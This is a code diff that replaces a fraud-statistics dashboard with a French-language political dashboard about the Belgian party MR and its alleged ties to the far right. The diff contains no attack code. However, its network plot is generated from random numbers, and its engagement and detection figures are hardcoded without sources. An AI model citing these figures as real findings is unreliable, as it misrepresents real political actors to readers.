-            const words = label.split(' ');
-            const lines = [];
-            let currentLine = words[0];
-
-            for (let i = 1; i < words.length; i++) {
-                if (currentLine.length + 1 + words[i].length <= 16) {
-                    currentLine += ' ' + words[i];
-                } else {
-                    lines.push(currentLine);
-                    currentLine = words[i];
-                }
-            }
-            lines.push(currentLine);
-            return lines;
-        }
-
-        // Shared Tooltip Configuration (REQUIRED)
-        const sharedTooltipConfig = {
-            callbacks: {
-                title: function(tooltipItems) {
-                    const item = tooltipItems[0];
-                    let label = item.chart.data.labels[item.dataIndex];
-                    if (Array.isArray(label)) {
-                        return label.join(' ');
-                    } else {
-                        return label;
-                    }
-                }
-            },
-            backgroundColor: '#1E293B',
-            padding: 12,
-            titleFont: { family: 'Roboto', size: 14 },
-            bodyFont: { family: 'Roboto', size: 13 },
-            cornerRadius: 4,
-            displayColors: true
+        // --- DATA & STATE MANAGEMENT ---
+        const state = {
+            currentSection: 'dashboard',
+            radarCompare: true
         };
 
-        // --- Chart Generation ---
+        const tacticsData = [
+            {
+                title: "Le 'Clash' comme Carburant",
+                icon: "⚡",
+                desc: "Privilégier les formats courts et polémiques (tweets, reels) qui attaquent frontalement un adversaire (souvent Ecolo ou le PS) pour générer de la viralité, reprise ensuite par les réseaux d'extrême droite.",
+                metric: "+400% d'engagement sur les posts négatifs"
+            },
+            {
+                title: "Dog Whistling",
+                icon: "🐕",
+                desc: "Utilisation de termes codés (ex: 'Bruxellisation', 'ensauvagement', 'wokisme') qui semblent anodins pour le grand public mais qui signalent une alliance idéologique aux radicaux.",
+                metric: "Détecté dans 35% des communications"
+            },
+            {
+                title: "La Victimation Stratégique",
+                icon: "🛡️",
+                desc: "Se présenter comme les 'seuls défenseurs de la liberté' ou du 'bon sens' face à une prétendue censure médiatique ou politique ('La pensée unique').",
+                metric: "Thème récurrent (Top 3)"
+            },
+            {
+                title: "Triangulation des Thèmes",
+                icon: "🔺",
+                desc: "Adopter les constats de l'extrême droite (insécurité, immigration) tout en proposant des solutions 'libérales-autoritaires' pour siphonner l'électorat radical.",
+                metric: "Stratégie électorale centrale"
+            }
+        ];
 
-        document.addEventListener('DOMContentLoaded', function() {
+        // --- NAVIGATION LOGIC ---
+        function navigate(sectionId) {
+            // Update State
+            state.currentSection = sectionId;
+
+            // Hide all sections
+            document.querySelectorAll('.section-view').forEach(el => el.classList.remove('active'));
             
-            // 1. Fraud Types (Doughnut)
-            const typeCtx = document.getElementById('fraudTypeChart').getContext('2d');
-            const typeLabels = ['Domiciliation Fictive', 'Travail au Noir', 'Fraude Cotisations', 'Indemnités Chômage'];
-            
-            new Chart(typeCtx, {
-                type: 'doughnut',
-                data: {
-                    labels: typeLabels.map(wrapLabel),
-                    datasets: [{
-                        data: [30, 35, 20, 15],
-                        backgroundColor: [
-                            '#3B82F6', // Blue 500
-                            '#F97316', // Orange 500
-                            '#06B6D4', // Cyan 500
-                            '#64748B'  // Slate 500
-                        ],
-                        borderWidth: 0,
-                        hoverOffset: 4
-                    }]
-                },
-                options: {
-                    responsive: true,
-                    maintainAspectRatio: false,
-                    plugins: {
-                        legend: {
-                            position: 'bottom',
-                            labels: {
-                                usePointStyle: true,
-                                padding: 20,
-                                font: { family: 'Roboto', size: 11 }
-                            }
-                        },
-                        tooltip: sharedTooltipConfig
-                    },
-                    cutout: '70%'
-                }
-            });
+            // Show target section
+            document.getElementById(sectionId).classList.add('active');
 
-            // 2. Trends (Line)
-            const trendCtx = document.getElementById('fraudTrendChart').getContext('2d');
-            const trendLabels = ['T1 2023', 'T2 2023', 'T3 2023', 'T4 2023', 'T1 2024'];
-            
-            new Chart(trendCtx, {
-                type: 'line',
-                data: {
-                    labels: trendLabels,
-                    datasets: [{
-                        label: 'Cas Détectés',
-                        data: [45, 52, 88, 95, 110],
-                        borderColor: '#F97316',
-                        backgroundColor: 'rgba(249, 115, 22, 0.1)',
-                        borderWidth: 3,
-                        tension: 0.4,
-                        fill: true,
-                        pointBackgroundColor: '#FFFFFF',
-                        pointBorderColor: '#F97316',
-                        pointBorderWidth: 2,
-                        pointRadius: 4
-                    }]
-                },
-                options: {
-                    responsive: true,
-                    maintainAspectRatio: false,
-                    scales: {
-                        y: {
-                            beginAtZero: true,
-                            grid: { color: '#F1F5F9' },
-                            ticks: { font: { family: 'Roboto' } }
-                        },
-                        x: {
-                            grid: { display: false },
-                            ticks: { font: { family: 'Roboto' } }
-                        }
-                    },
-                    plugins: {
-                        legend: { display: false },
-                        tooltip: sharedTooltipConfig
-                    }
-                }
-            });
+            // Update Buttons
+            document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active'));
+            // Find the button that calls this function (simple heuristic for this demo)
+            const activeBtn = Array.from(document.querySelectorAll('.nav-btn')).find(b => b.getAttribute('onclick').includes(sectionId));
+            if(activeBtn) activeBtn.classList.add('active');
 
-            // 3. Sector Risks (Horizontal Bar)
-            const sectorCtx = document.getElementById('sectorRiskChart').getContext('2d');
-            const sectorLabels = ['Construction & Rénov.', 'Horeca & Restauration', 'Transport & Logistique', 'Nettoyage Industriel', 'Commerce de Détail'];
+            // Trigger specific chart resizes if needed (Chart.js handles this mostly, Plotly might need help)
+            if (sectionId === 'network') {
+                setTimeout(() => {
+                    Plotly.Plots.resize('networkPlot');
+                }, 50);
+            }
+        }
 
-            new Chart(sectorCtx, {
+        function toggleMobileMenu() {
+            const menu = document.getElementById('mobile-menu');
+            menu.classList.toggle('hidden');
+        }
+
+        // --- CHART INITIALIZATION ---
+
+        // 1. Dashboard Overview Chart (Bar)
+        function initOverviewChart() {
+            const ctx = document.getElementById('overviewChart').getContext('2d');
+            new Chart(ctx, {
                 type: 'bar',
                 data: {
-                    labels: sectorLabels.map(wrapLabel),
-                    datasets: [{
-                        label: 'Indice de Risque (0-100)',
-                        data: [92, 78, 65, 55, 40],
-                        backgroundColor: '#3B82F6',
-                        borderRadius: 4,
-                        barPercentage: 0.6
-                    }]
+                    labels: ['Jan', 'Fév', 'Mar', 'Avr', 'Mai', 'Juin'],
+                    datasets: [
+                        {
+                            label: 'Interactions Officielles MR',
+                            data: [120, 130, 125, 140, 150, 160],
+                            backgroundColor: '#1e40af', // Blue 800
+                            borderRadius: 4
+                        },
+                        {
+                            label: 'Interactions avec Sphère Radicale',
+                            data: [30, 45, 60, 85, 90, 110],
+                            backgroundColor: '#f97316', // Orange 500
+                            borderRadius: 4
+                        }
+                    ]
                 },
                 options: {
-                    indexAxis: 'y',
                     responsive: true,
                     maintainAspectRatio: false,
-                    scales: {
-                        x: {
-                            beginAtZero: true,
-                            max: 100,
-                            grid: { color: '#F1F5F9' }
-                        },
-                        y: {
-                            grid: { display: false },
-                            ticks: { font: { family: 'Roboto', size: 12, weight: '500' } }
-                        }
-                    },
                     plugins: {
-                        legend: { display: false },
-                        tooltip: sharedTooltipConfig
+                        legend: { position: 'bottom' },
+                        tooltip: { mode: 'index', intersect: false }
+                    },
+                    scales: {
+                        y: { beginAtZero: true, grid: { color: '#f1f5f9' } },
+                        x: { grid: { display: false } }
                     }
                 }
             });
+        }
+
+        // 2. Dashboard Topic Donut
+        function initTopicDonut() {
+            const ctx = document.getElementById('topicDonut').getContext('2d');
+            new Chart(ctx, {
+                type: 'doughnut',
+                data: {
+                    labels: ['Sécurité / Justice', 'Immigration', 'Anti-Wokisme', 'Économie / Fiscalité', 'Mobilité (Auto)'],
+                    datasets: [{
+                        data: [30, 25, 20, 15, 10],
+                        backgroundColor: [
+                            '#1e3a8a', // Dark Blue
+                            '#f97316', // Orange
+                            '#ef4444', // Red (Alert)
+                            '#94a3b8', // Slate (Neutral)
+                            '#3b82f6'  // Light Blue
+                        ],
+                        borderWidth: 0
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    cutout: '60%',
+                    plugins: {
+                        legend: { position: 'right', labels: { boxWidth: 12 } }
+                    }
+                }
+            });
+        }
+
+        // 3. Network Plot (Plotly)
+        function initNetworkPlot() {
+            // Simulated Data Generation
+            // Cluster 1: MR Official (Center-Right)
+            const trace1 = {
+                x: Array.from({length: 20}, () => Math.random() * 0.5),
+                y: Array.from({length: 20}, () => Math.random() * 0.8),
+                mode: 'markers',
+                type: 'scatter',
+                name: 'Cadres MR Traditionnels',
+                marker: { size: 10, color: '#1e40af' },
+                text: Array(20).fill('Cadre du Parti')
+            };
+
+            // Cluster 2: Hardline Branch (Drifting Right)
+            const trace2 = {
+                x: Array.from({length: 15}, () => 0.4 + Math.random() * 0.4),
+                y: Array.from({length: 15}, () => 0.4 + Math.random() * 0.6),
+                mode: 'markers',
+                type: 'scatter',
+                name: 'Branche "Dure"',
+                marker: { size: 14, color: '#f97316' }, // Orange
+                text: Array(15).fill('Compte Influent Droitier')
+            };
+
+            // Cluster 3: Fachosphere (Far Right)
+            const trace3 = {
+                x: Array.from({length: 25}, () => 0.7 + Math.random() * 0.3),
+                y: Array.from({length: 25}, () => Math.random() * 0.8),
+                mode: 'markers',
+                type: 'scatter',
+                name: 'Fachosphère / Ext. Droite',
+                marker: { size: 8, color: '#ef4444' }, // Red
+                text: Array(25).fill('Compte Fachosphère')
+            };
+
+            const layout = {
+                hovermode: 'closest',
+                showlegend: true,
+                legend: { orientation: 'h', y: -0.1 },
+                xaxis: { title: 'Positionnement Idéologique (Gauche -> Droite)', showgrid: true, zeroline: false, showticklabels: false },
+                yaxis: { title: 'Influence Numérique', showgrid: true, zeroline: false, showticklabels: false },
+                margin: { l: 40, r: 20, t: 20, b: 40 },
+                dragmode: 'pan',
+                plot_bgcolor: '#f8fafc',
+                paper_bgcolor: '#ffffff'
+            };
+
+            Plotly.newPlot('networkPlot', [trace1, trace2, trace3], layout, {responsive: true, displayModeBar: false});
+        }
+
+        // 4. Radar Chart (Ideology)
+        let radarChartInstance;
+        function initRadarChart() {
+            const ctx = document.getElementById('radarChart').getContext('2d');
+            const dataModern = [90, 85, 80, 40, 30]; // Identity, Security, Anti-Woke, Fiscal, Ecology
+            const dataLegacy = [30, 50, 10, 90, 60]; 
+
+            radarChartInstance = new Chart(ctx, {
+                type: 'radar',
+                data: {
+                    labels: ['Identité/Nationalisme', 'Sécurité & Ordre', 'Anti-Progressisme', 'Rigueur Budgétaire', 'Libertés Individuelles'],
+                    datasets: [
+                        {
+                            label: 'Branche Dure (Actuel)',
+                            data: dataModern,
+                            fill: true,
+                            backgroundColor: 'rgba(249, 115, 22, 0.2)', // Orange
+                            borderColor: 'rgb(249, 115, 22)',
+                            pointBackgroundColor: 'rgb(249, 115, 22)',
+                            pointBorderColor: '#fff',
+                            pointHoverBackgroundColor: '#fff',
+                            pointHoverBorderColor: 'rgb(249, 115, 22)'
+                        },
+                        {
+                            label: 'MR Traditionnel (2010)',
+                            data: dataLegacy,
+                            fill: true,
+                            backgroundColor: 'rgba(30, 64, 175, 0.2)', // Blue
+                            borderColor: 'rgb(30, 64, 175)',
+                            pointBackgroundColor: 'rgb(30, 64, 175)',
+                            pointBorderColor: '#fff',
+                            pointHoverBackgroundColor: '#fff',
+                            pointHoverBorderColor: 'rgb(30, 64, 175)'
+                        }
+                    ]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    elements: { line: { borderWidth: 3 } },
+                    scales: {
+                        r: {
+                            angleLines: { display: true },
+                            suggestedMin: 0,
+                            suggestedMax: 100,
+                            ticks: { display: false } // Hide numbers for cleaner look
+                        }
+                    }
+                }
+            });
+
+            // Toggle functionality
+            document.getElementById('toggleRadarData').addEventListener('click', () => {
+                const legacyDataset = radarChartInstance.data.datasets[1];
+                legacyDataset.hidden = !legacyDataset.hidden;
+                radarChartInstance.update();
+            });
+        }
+
+        // 5. Timeline Chart
+        function initTimelineChart() {
+            const ctx = document.getElementById('timelineChart').getContext('2d');
+            new Chart(ctx, {
+                type: 'line',
+                data: {
+                    labels: ['Jan', 'Fev', 'Mar', 'Avr', 'Mai', 'Juin', 'Juil', 'Aout', 'Sep', 'Oct', 'Nov', 'Dec'],
+                    datasets: [{
+                        label: 'Indice de Toxicité / Polarisation',
+                        data: [20, 25, 30, 65, 40, 35, 30, 45, 80, 60, 55, 70],
+                        borderColor: '#dc2626', // Red
+                        backgroundColor: 'rgba(220, 38, 38, 0.1)',
+                        fill: true,
+                        tension: 0.4
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: {
+                        annotation: {
+                            // This would be cleaner with chartjs-plugin-annotation but sticking to core for simplicity/robustness in single file
+                        },
+                        tooltip: {
+                            callbacks: {
+                                label: function(context) {
+                                    if(context.raw > 60) return "Pic de crise (Ex: Polémique EVRAS)";
+                                    return "Niveau d'activité: " + context.raw;
+                                }
+                            }
+                        }
+                    },
+                    scales: {
+                        y: { beginAtZero: true, grid: { borderDash: [5, 5] } },
+                        x: { grid: { display: false } }
+                    }
+                }
+            });
+        }
+
+        // 6. Populate Tactics Cards
+        function initTactics() {
+            const container = document.getElementById('tacticsContainer');
+            tacticsData.forEach(tactic => {
+                const card = document.createElement('div');
+                card.className = "bg-white p-6 rounded-xl shadow border-t-4 border-orange-500 hover:shadow-lg transition-shadow";
+                card.innerHTML = `
+                    <div class="flex items-center mb-3">
+                        <span class="text-3xl mr-3">${tactic.icon}</span>
+                        <h3 class="text-xl font-bold text-slate-800">${tactic.title}</h3>
+                    </div>
+                    <p class="text-slate-600 mb-4 text-sm leading-relaxed">${tactic.desc}</p>
+                    <div class="bg-slate-50 p-2 rounded text-xs font-semibold text-slate-500 border border-slate-200">
+                        DATA : ${tactic.metric}
+                    </div>
+                `;
+                container.appendChild(card);
+            });
+        }
+
+        // --- INIT ---
+        window.addEventListener('DOMContentLoaded', () => {
+            initOverviewChart();
+            initTopicDonut();
+            initNetworkPlot();
+            initRadarChart();
+            initTimelineChart();
+            initTactics();
         });
+
     </script>
 </body>
 </html>
